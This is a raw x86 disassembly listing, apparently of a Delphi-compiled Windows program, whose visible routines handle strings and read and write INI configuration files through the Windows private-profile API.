add [ edi + ebx + 0x43 ] al
add [ edi + ebx + 0x13dc0043 ] ah
inc ebx
add [ eax ] ch
adc eax 0x15840043
add [ eax + 0x1a ] ah
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + eax ] al
add [ eax ] al
push cs
push esp
inc ebx
jne r-xdata
add al dl
sbb al [ ebx ]
mov al 0x15
inc ebx
add [ eax + 0x16 ] ch
inc ebx
add [ eax ] ah
pop ss
inc ebx
add al bl
pop ss
inc ebx
add [ esp + ebx + 0x18900043 ] ah
inc ebx
add al bh
sbb [ ebx ] al
pop eax
sbb [ ebx ] eax
mov esp 0xd4004319
and [ ebx ] eax
adc [ eax ] ah
inc ebx
add [ esi + ebx ] dh
inc ebx
add [ edx + 0x43 ] bh
add ah cl
and eax [ ebx ]
and [ ebx + eax * 2 ] ah
add [ eax + 0x24 ] dl
inc ebx
add [ eax + 0x1a ] ah
inc ebx
add [ eax ] cl
push esp
dec ecx
outsb
imul eax [ esi + 0x69 ] 0x9090656c
nop
inc ebx
add [ ebp + edx + 0x1a440043 ] al
inc ebx
je r-xdata
inc ebx
add [ edx + ebx + 0x43 ] al
sub [ 0x15840043 ] dl
insd
dec ecx
outsb
imul eax [ esi + 0x69 ] 0x9090656c
nop
xor al 0x13
inc ebx
sub_4313a0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_449d2c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4313dc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431506
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax 0x2
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4358c0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43150d
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax ] 0x30
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp [ eax + 0x2 ] 0x58
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cmp [ eax + 0x2 ] 0x78
sete al
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx 0x7fffffff
mov edx 0x3
mov eax [ ebp - 0x4 ]
call sub_44a368
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44a0e8
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_43151f
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431574
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
call sub_435628
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43157b
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_431584
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
test eax eax
setne al
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4315b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431655
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43165c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor eax eax
push ebp
push j_sub_4489d0#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4390a0
fstp [ ebp - 0x10 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43161f
add al [ eax ]
add [ eax ] al
jl r-xdata
pop ebp
retn 0x8
inc ebx
add [ edx ] bh
push ss
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xffffffffeb004316 ] dh
add eax 0x1766ee8
add al ch
mov ebp 0x33000176
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_43165c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_431668
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43170d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431714
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor eax eax
push ebp
push j_sub_4489d0#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_439228
fstp [ ebp - 0x10 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4316d7
add al [ eax ]
add [ eax ] al
jl r-xdata
pop ebp
retn 0x8
inc ebx
add dl dh
push ss
inc ebx
add [ eax ] al
add [ eax ] al
add ch ch
push ss
inc ebx
add bl ch
add eax 0x175b6e8
add al ch
add eax 0x33000176
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_431714
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_431720
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4317c5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4317cc
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor eax eax
push ebp
push j_sub_4489d0#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4372f8
fstp [ ebp - 0x10 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43178f
add al [ eax ]
add [ eax ] al
jl r-xdata
pop ebp
retn 0x8
inc ebx
add [ edx + 0x4317 ] ch
add [ eax ] al
add [ ebp - 0x14ffbce9 ] ah
add eax 0x174fee8
add al ch
dec ebp
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4317cc
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
sub_4317d8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43187d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431884
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
xor eax eax
push ebp
push j_sub_4489d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_439164
fstp [ ebp - 0x10 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_431847
add al [ eax ]
add [ eax ] al
jl r-xdata
pop ebp
retn 0x8
inc ebx
add [ edx + 0x18 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp + 0x18 ] bl
inc ebx
add bl ch
add eax 0x17446e8
add al ch
xchg ebp eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431884
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
sub_431890
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4318e7
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x4 ]
call sub_438528
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4318ee
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4318f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431949
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_438528
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431950
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_431958
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4319ab
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4 ]
call sub_437298
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4319b2
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4319bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431a13
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
lea eax [ ebp - 0x4 ]
call sub_438528
mov eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431a1a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_431a3b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
movzx ebx [ ebp + 0x8 ]
mov ebx [ ebx * 4 + rw-data ]
push ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ebp
retn 0x4
sub_431a60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_431abe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
setg [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431ac5
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub_431ad0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431c8e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431c95
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
xor edx edx
push ebp
push sub_431c6c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x10 ]
call sub_427274
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
sar esi 0x1
jns r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
add edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
adc esi 0x0
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_427274
push edx
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_449db8
mov ecx esi
sar ecx 0x1
jns r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edx edi
call sub_42d80c
mov eax ebx
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
call sub_427294
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
sub eax ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
retn
mov eax [ ebp - 0x10 ]
call sub_4481b0
mov ecx eax
test ecx ecx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax ecx
sar eax 0x1
jns r-xdata
sub ecx 0x4
mov ecx [ ecx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
cdq
push edx
push eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_427538
adc eax 0x0
sub_431ca4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_431e25
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp + 0x8 ]
call sub_427274
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
call sub_44ab8c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_449fd0
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431e2c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_427274
push edx
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov ebx eax
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax [ ebp - 0x14 ]
call sub_427274
sub esi eax
mov eax [ ebp - 0x4 ]
call sub_449db8
mov edx eax
mov eax ebx
mov ecx esi
call sub_42d7cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp + 0x8 ]
call sub_427274
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_427538
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_427294
xor eax eax
push ebp
push sub_431df6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
retn
mov eax [ ebp - 0x14 ]
call sub_4481b0
sub_431e34
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_431f0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431f12
lea eax [ ebp - 0x14 ]
call j_sub_449348
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
mov [ ebp - 0x10 ] eax
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_44a368
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43501c
test al al
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_431f18
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_431f44
push ebp
mov ebp esp
add esp 0xfffff004
push eax
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_449db8
push eax
push 0x800
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0xc ]
call sub_449db8
push eax
mov eax edi
call sub_449db8
push eax
mov eax esi
call sub_449db8
push eax
call GetPrivateProfileStringW
mov ecx eax
lea edx [ ebp - 0x1000 ]
mov eax [ ebp + 0x8 ]
call sub_449e68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_431fa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_449db8
push eax
mov eax [ ebp + 0x8 ]
call sub_449db8
push eax
mov eax edi
call sub_449db8
push eax
mov eax esi
call sub_449db8
push eax
call WritePrivateProfileStringW
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_432010
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_432105
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax 0x4000
call sub_44748c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4320e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_425a78
xor eax eax
push ebp
push sub_4320cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebx + 0x4 ]
call sub_449db8
push eax
push 0x4000
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x0
call GetPrivateProfileStringW
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4320d2
mov eax [ ebp - 0x4 ]
call sub_425b40
retn
mov ebx [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_449ed8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_4360a4
inc eax
add eax eax
add ebx eax
sub_432114
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffff0
xor eax eax
push ebp
push sub_4321c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425a78
xor eax eax
push ebp
push sub_4321aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4321b1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425b40
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_449ed8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx ]
call sub_4360a4
inc eax
add eax eax
add [ ebx ] eax
sub_4321d4
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] 0x400
mov eax [ ebp - 0x1c ]
add eax eax
call sub_44748c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_432260
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
call sub_449db8
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_449db8
push eax
call GetPrivateProfileStringW
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
sub eax 0x2
cmp eax [ ebp - 0x8 ]
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_4474a8
retn
push ebp
call sub_432114
pop ecx
call sub_448d2c
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_43227c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4323ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42723c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43238c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0xc ]
call sub_425a78
xor eax eax
push ebp
push sub_43236f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432376
mov eax [ ebp - 0xc ]
